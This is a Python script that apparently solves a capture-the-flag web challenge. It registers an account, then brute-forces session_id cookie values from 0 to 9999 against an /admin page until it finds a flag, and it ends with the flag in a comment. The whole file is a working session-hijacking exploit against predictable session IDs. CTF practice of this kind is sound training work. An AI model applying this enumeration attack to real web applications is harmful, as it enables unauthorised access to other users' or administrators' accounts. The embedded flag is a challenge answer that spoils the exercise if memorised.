import requests


site = "http://too-small-reminder.challs.olicyber.it"
s = requests.session()

json1 = {
    "username" : "zamvv",
    "password" : "uoo"
}

register = s.post(f"{site}/register", json = json1)
print(register.text)
login = s.post(f"{site}/login", json = json1 )
print(login.text)

for i in range(10000):    
    
    r = requests.get(f"{site}/admin", 
                     cookies={"session_id":f"{i}"})
    
    if "flag" in r.text.lower():
        print(r.text)
        print(f"session_id : {i} corretto")
        break
    else:
        print(f"{r.text}, {i}")

#flag{d0n7_cr3473_y0ur_535510n5}
